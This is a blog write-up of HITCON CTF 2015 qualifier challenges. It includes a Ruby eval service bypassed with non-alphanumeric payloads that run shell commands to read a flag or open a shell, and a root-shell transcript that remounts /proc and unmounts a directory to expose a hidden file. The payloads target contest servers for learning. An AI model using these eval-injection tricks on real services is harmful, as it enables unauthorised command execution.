Title: HITCON CTF 2015 Quals Write-up  
Slug: hitcon-ctf-2015-quals-write-up  
Date: 2015-10-19 11:42:55  
Authors: fkz  
Category: Conf/Meetup  
Tags: CTF, HITCON, Write-up, Ruby, Conf, Security  
Summary: Just a write-up for HITCON CTF 2015 Quals. So difficult. T_T  
  
  
## MISC - Flag not Found [1]  
  
Any `404 Nout Found` page on <https://ctf2015.hitcon.org> will print out the flag.  
  
![Flag not Found](/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png)  
  
The flag is `hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}`  
  
---  
  
## MISC - hard to say [50*4]  
  
A description  
  
```  
Ruby on Fails.  
FLAG1: nc 54.199.215.185 9001  
FLAG2: nc 54.199.215.185 9002  
FLAG3: nc 54.199.215.185 9003  
FLAG4: nc 54.199.215.185 9004  
```  
  
with a Ruby source code `hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb`  
  
```ruby  
#!/usr/bin/env ruby  
  
fail 'flag?' unless File.file?('flag')  
  
$stdout.sync = true  
  
limit = ARGV[0].to_i  
puts "Hi, I can say #{limit} bytes :P"  
s = $stdin.gets.strip!  
  
if s.size > limit || s[/[[:alnum:]]/]  
  puts 'oh... I cannot say this, maybe it is too long or too weird :('  
  exit  
end  
  
puts "I think size = #{s.size} is ok to me."  
r = eval(s).to_s  
r[64..-1] = '...' if r.size > 64  
puts r  
```  
  
We can see that:  
  
1. The program will accept an input.  
2. There's a flag at `./flag`.  
3. There's a input length limit which has been assigned as argv[0] since the program started.  
    + For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  
4. You cannot have alphabets and numbers in the input.  
5. If your input pass the length and non-alnum test, it will be the argument of `eval()`  
6. The program print out the result of `eval(input)`  
  
### Flag1 (1024 bytes)  
  
At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.  
Until one of my teammates gave a link [Non-Alphanumeric Ruby for Fun and Not Much Else](http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/).  
After some discussions, try-and-error and with this link [Calling shell commands from Ruby - Stack Overflow](http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby),  
we came up with `226 bytes` solution for flag1.  
  
```Ruby  
_=$$/$$;__=_-_;@_=_+_;$_=@_+_;$__=@_+$_;@__=$__*$_;`#{''<<($_*@_)*@__+($_*$_)<<($_*@_)*@__+($__+@_)<<($_+$__)*@__-@_*@_<<@__*@_+@_<<@__*$_+_<<@__*$_+@_<<($__+@_)*@__-$_<<($__+@_)*@__+$_<<($_*@_)*@__+($__+@_)<<($__+@_)*@__-@_}`  
```  
  
which equal to  
  
```Ruby  
`#{'cat ./flag'}`  
```  
  
as a string input.  
then we got flag1.  
`hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`  
  
### Flag2 (64 bytes)  
  
After this, we got stucked with the 64 bytes limitation.  
I came up with calling `sh` to get shell instead of just `cat flag`,  
and one of my teammates found out that `$$` is always `4` on the target server.  
So, we came up with the `61 bytes` solution for flag2.  
  
```Ruby  
$_=$$/$$;@_=($_+$_)*($$+$_);$.=@_*@_+$$;`#{''<<$.+@_+$_<<$.}`  
  
# $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii('s') == 115; ascii('h') == 104;  
# `#{''<<115<<104}` == `#{'sh'}`  
```  
  
After got the shell, just type `cat flag` then `^D` to get the output.  
We got flag2.  
`hitcon{Ruby in Peace m()m}`  
  
### Flag3 (36 bytes)  
  
One of my teammates came up with calling `$0` instead of `sh` to get shell,  
we got the `26 bytes` solution.  
  
```Ruby  
`#{'$'<<$$*$$*($$-$$/$$)}`  
  
# `#{'$'<<48}` == `#{'$0'}`  
```  
  
then we got flag3  
`hitcon{My cats also know how to code in ruby :cat:}`  
  
### Flag4 (10 bytes)  
  
After this, I was trying to find how to just embed number into the string not by using `<<`.  
I found this link [Ruby: eval with string interpolation - Stack Overflow](http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation).  
I also found that the predefined variable `$.` is `The number of the last line read from the current input file.`  
It means that in this use case, `$.` will always be `1`.  
so I came up with `11 bytes` solution  
  
```Ruby  
`$#{$.-$.}`  
```  
  
Still 1 byte more than the limitation,  
I kept finding if there's a predefined variable in Ruby defualt to `0` or  
if `nil` can be trans to `0` because lots of predefined variable are default to `nil`.  
But NO.  
  
Then one of my teammates came up with the `10 bytes` solution,  
by using `~`, the `Binary Ones Complement Operator`. (bitwise Not)  
  
```Ruby  
`$#{~-$.}`  
  
# `$#{~-1}` == `$#{0}` == `$0`  
```  
  
then we got flag4  
`hitcon{It's hard to say where ruby went wrong QwO}`  
  
### Note  
  
After the competition end,  
the author of this challenge released the same 10 bytes solution on IRC.  
But said they got a `9 bytes` solution  
  
```Ruby  
`$#{~//}`  
```  
  
I don't know how this solution works,  
but it does not work on my computer with Ruby 2.2.3,  
which `~//` will be treat as `nil` instead of `0`.  
  
---  
  
## Stego - Piranha Gun [50]  
  
```  
The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning "piranha" projectile that costs no ammunition.  
`nc 54.178.235.243 10004`  
```  
  
```  
$ nc 54.178.235.243 10004  
bash: cannot set terminal process group (-1): Inappropriate ioctl for device  
bash: no job control in this shell  
bash: /root/.bashrc: Permission denied  
root@ip-172-31-19-201:/home/PiranhaGun# ls  
ls  
README  
```  
  
After connected to the server, there's a README.  
  
```  
root@ip-172-31-19-201:/home/PiranhaGun# cat README  
cat README  
The Piranha Gun can be found in "jungle.chest".  
```  
  
We searched if there's a file or directory with this name by using  
  
`grep -r "jungle.chest" / 2>/dev/null`  
`grep -r "jungle" / 2>/dev/null`  
`grep -r "chest" / 2>/dev/null`  
  
But NO. There's only a directory `/chest`, but it's empty.  
  
After tried something else, we still stucked.  
Then, one of my teammates said he remembered security issue about the `proc` in container.  
After took a look at `ps`, we got a clue.  
  
```  
root@ip-172-31-19-201:/home/PiranhaGun# ps  
ps  
Error, do this: mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  
mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  
cd /proc  
root@ip-172-31-19-201:/proc# ls -al  
ls -al  
total 4  
dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  
drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  
dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  
dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  
-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  
lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -> self/mounts  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  
lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -> self/net  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  
dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -> 7  
-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  
dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  
--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -> 7/task/7  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  
-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  
```  
  
Let's take some search.  
  
```  
root@ip-172-31-19-201:/proc# grep -r "chest" . 2>/dev/null  
grep -r "chest" . 2>/dev/null  
./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
Binary file ./15/task/15/cmdline matches  
./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
Binary file ./15/cmdline matches  
./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
```  
  
We've already found `/chest` before and knew it's empty.  
So, maybe unmount it?  
  
```  
root@ip-172-31-19-201:/proc# umount /chest  
umount /chest  
root@ip-172-31-19-201:/proc# cd /chest  
cd /chest  
root@ip-172-31-19-201:/chest# ls  
ls  
jungle.chest  
```  
  
ta da!  
  
```  
root@ip-172-31-19-201:/chest# cat jungle.chest  
cat jungle.chest  
hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  
```  
  
---  
  
## Stego - unreadable [100]  
  
We got a file [unreadable-4b2868cc26a8dad5695e537a9dd8a164](/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164)  
  
by using `xxd` to check it.  
  
![unreadable](/files/hitcon-ctf-2015-quals-write-up/unreadable.png)  
  
the flag is `hitcon{WE USE XXD INSTEAD OF IDA PRO}`  
